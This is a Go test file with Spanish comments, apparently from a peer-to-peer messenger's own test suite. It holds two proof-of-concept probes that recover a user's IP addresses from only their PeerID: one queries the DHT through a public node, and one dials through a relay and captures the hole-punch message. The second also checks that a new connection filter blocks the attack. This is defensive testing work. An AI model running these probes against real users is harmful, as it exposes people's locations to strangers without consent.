package bridge

import (
	"context"
	"os"
	"strings"
	"testing"
	"time"

	dht "github.com/libp2p/go-libp2p-kad-dht"
	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	holepunchpb "github.com/libp2p/go-libp2p/p2p/protocol/holepunch/pb"
	"github.com/libp2p/go-msgio/pbio"
	multiaddr "github.com/multiformats/go-multiaddr"
	manet "github.com/multiformats/go-multiaddr/net"
)

// TestIPLeakAgainstLiveNode es la PRUEBA DE CONCEPTO de que un extraño que solo conoce tu
// PeerID puede sacar tus direcciones (incluida la IP) preguntándole al nodo público. Modela
// al atacante: una identidad EFÍMERA (no es contacto de nadie), con la única ventaja de saber
// (a) los nodos, que van dentro del APK, y (b) el PeerID de la víctima, que no es secreto.
//
// No deposita, no envía, no es contacto: solo se une a la DHT como cliente y hace FindPeer.
// Se auto-omite sin las variables:
//
//	LEAK_BOOTSTRAP="/ip4/216.128.169.83/tcp/4001/p2p/<nodeID>" \
//	LEAK_TARGET="12D3Koo…<PeerID de la víctima>" \
//	  go test -run TestIPLeakAgainstLiveNode -v .
func TestIPLeakAgainstLiveNode(t *testing.T) {
	bootstrap := os.Getenv("LEAK_BOOTSTRAP")
	target := os.Getenv("LEAK_TARGET")
	if bootstrap == "" || target == "" {
		t.Skip("LEAK_BOOTSTRAP/LEAK_TARGET no definidos; sonda solo bajo demanda")
	}
	victim, err := peer.Decode(target)
	if err != nil {
		t.Fatalf("PeerID objetivo inválido: %v", err)
	}

	// Host efímero: identidad al azar, sin persistir. Es lo único que necesita el atacante.
	h, err := libp2p.New(libp2p.ListenAddrStrings("/ip4/0.0.0.0/tcp/0"))
	if err != nil {
		t.Fatalf("host efímero: %v", err)
	}
	defer h.Close()
	t.Logf("atacante efímero: %s", h.ID())

	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()

	// Conectar SOLO al nodo público (el que va en el APK).
	nodes := parseAddrInfos(bootstrap)
	if len(nodes) == 0 {
		t.Fatalf("LEAK_BOOTSTRAP no parseó a ningún nodo")
	}
	if err := h.Connect(ctx, nodes[0]); err != nil {
		t.Fatalf("connect al nodo: %v", err)
	}
	kad, err := dht.New(ctx, h, dht.Mode(dht.ModeClient))
	if err != nil {
		t.Fatalf("dht: %v", err)
	}
	_ = kad.Bootstrap(ctx)

	// Esperar a que la tabla de rutas tenga al menos un servidor. Sin esto, FindPeer falla con
	// "failed to find any peer in table" y parece que no hay fuga cuando lo que pasa es que el
	// cliente aún no ha metido al nodo en su tabla (identify + protocolo DHT tardan un instante).
	for i := 0; i < 60 && kad.RoutingTable().Size() == 0; i++ {
		time.Sleep(500 * time.Millisecond)
	}
	t.Logf("tabla de rutas del atacante: %d nodo(s)", kad.RoutingTable().Size())

	// La pregunta del atacante: ¿dónde está esta PeerID?
	info, err := kad.FindPeer(ctx, victim)
	if err != nil {
		t.Fatalf("FindPeer(%s): %v — el nodo no reveló direcciones (¿la víctima está desconectada?)", shortID(victim), err)
	}
	if len(info.Addrs) == 0 {
		t.Fatalf("FindPeer no devolvió direcciones para %s", shortID(victim))
	}

	var publicIPs, privateIPs, relayed []string
	for _, a := range info.Addrs {
		s := a.String()
		switch {
		case strings.Contains(s, "/p2p-circuit"):
			relayed = append(relayed, s)
		case manet.IsPublicAddr(a):
			publicIPs = append(publicIPs, s)
		default:
			privateIPs = append(privateIPs, s)
		}
	}

	t.Logf("=== FUGA CONFIRMADA: el nodo entregó %d dirección(es) de %s a un extraño ===", len(info.Addrs), shortID(victim))
	for _, s := range publicIPs {
		t.Logf("  IP PÚBLICA  → %s", s)
	}
	for _, s := range privateIPs {
		t.Logf("  IP privada  → %s", s)
	}
	for _, s := range relayed {
		t.Logf("  vía relay   → %s", s)
	}
	if len(publicIPs) == 0 && len(privateIPs) == 0 {
		t.Logf("  (solo direcciones de relay; ninguna IP directa expuesta esta vez)")
	}
}

// TestIPLeakViaRelayDial es el SEGUNDO vector: el extraño marca a la víctima por su dirección
// de relay (la que le acaba de dar el nodo, ver el test de arriba) y espera. Dos cosas se
// comprueban:
//
//  1. Que la conexión **se acepta**: no hay ConnectionGater, así que el filtro de
//     `ChatService.onReceived` (que descarta PeerIDs desconocidos) llega tarde — identify y
//     DCUtR ya han hablado.
//  2. Qué direcciones manda la víctima. Ante una conexión ENTRANTE por relay, libp2p inicia
//     el hole punching solo (`holepuncher.go:278`) y envía en el CONNECT sus direcciones
//     públicas. Si la víctima está tras CGNAT no tiene ninguna y aborta: por eso este test
//     hay que repetirlo con el móvil en **WiFi** para cerrar el caso.
//
//	LEAK_CIRCUIT="/ip4/…/p2p/<relayID>/p2p-circuit" LEAK_TARGET="12D3Koo…" \
//	  go test -run TestIPLeakViaRelayDial -v .
func TestIPLeakViaRelayDial(t *testing.T) {
	circuit := os.Getenv("LEAK_CIRCUIT")
	target := os.Getenv("LEAK_TARGET")
	if circuit == "" || target == "" {
		t.Skip("LEAK_CIRCUIT/LEAK_TARGET no definidos; sonda solo bajo demanda")
	}
	victim, err := peer.Decode(target)
	if err != nil {
		t.Fatalf("PeerID objetivo inválido: %v", err)
	}
	relayAddr, err := multiaddr.NewMultiaddr(circuit)
	if err != nil {
		t.Fatalf("LEAK_CIRCUIT inválido: %v", err)
	}

	h, err := libp2p.New(
		libp2p.ListenAddrStrings("/ip4/0.0.0.0/tcp/0"),
		libp2p.EnableRelay(),
	)
	if err != nil {
		t.Fatalf("host efímero: %v", err)
	}
	defer h.Close()
	t.Logf("atacante efímero: %s", h.ID())

	// Capturar el CONNECT de DCUtR que la víctima envía por su cuenta.
	punch := make(chan []string, 1)
	h.SetStreamHandler("/libp2p/dcutr", func(s network.Stream) {
		defer s.Close()
		rd := pbio.NewDelimitedReader(s, 4096)
		var msg holepunchpb.HolePunch
		if err := rd.ReadMsg(&msg); err != nil {
			punch <- []string{"(stream DCUtR abierto, pero no se pudo leer: " + err.Error() + ")"}
			return
		}
		var addrs []string
		for _, b := range msg.ObsAddrs {
			if a, err := multiaddr.NewMultiaddrBytes(b); err == nil {
				addrs = append(addrs, a.String())
			}
		}
		punch <- addrs
	})

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	// Las conexiones relayadas son "limited": sin esto libp2p ni las intenta.
	dialCtx := network.WithAllowLimitedConn(ctx, "poc-ip-leak")
	// Con el filtro de `gater.go` puesto, esto **debe** fallar: es el resultado bueno. Antes del
	// 10 sep 2026 no fallaba, y de ahí salía la IP.
	if err := h.Connect(dialCtx, peer.AddrInfo{ID: victim, Addrs: []multiaddr.Multiaddr{relayAddr}}); err != nil {
		t.Logf("=== ✅ el filtro cortó al extraño: %v ===", err)
		t.Logf("sin conexión aceptada no hay identify ni hole punching, así que no hay fuga de IP")
		return
	}
	// OJO: que `Connect` no dé error NO significa que la víctima la haya aceptado. El que marca
	// puede dar el handshake por completado un instante antes de que el otro lado cierre por
	// filtro. Lo que decide es si la conexión **se puede usar**.
	sctx, scancel := context.WithTimeout(context.Background(), 8*time.Second)
	defer scancel()
	s, serr := h.NewStream(network.WithAllowLimitedConn(sctx, "poc-ip-leak"), victim, "/krypta/msg/1.0.0")
	if serr != nil {
		t.Logf("=== ✅ el filtro cortó al extraño: la conexión no es usable (%v) ===", serr)
		t.Logf("sin conexión aceptada no hay identify ni hole punching, así que no hay fuga de IP")
		return
	}
	_ = s.Reset()
	t.Logf("=== ⚠️ CONEXIÓN ACEPTADA Y USABLE por %s sin ser contacto suyo ===", shortID(victim))

	// Dar tiempo a identify y al hole punching que la víctima inicia sola.
	select {
	case addrs := <-punch:
		t.Logf("=== la víctima abrió DCUtR y mandó sus direcciones a un extraño ===")
		for _, a := range addrs {
			t.Logf("  → %s", a)
		}
		if len(addrs) == 0 {
			t.Logf("  (sin direcciones: probablemente CGNAT, no tiene ninguna pública)")
		}
	case <-time.After(45 * time.Second):
		t.Logf("sin DCUtR en 45 s: la víctima no tiene dirección pública que ofrecer (CGNAT) o lo abortó")
	}

	t.Logf("direcciones que el extraño conoce de la víctima tras identify:")
	for _, a := range h.Peerstore().Addrs(victim) {
		t.Logf("  · %s", a)
	}
}
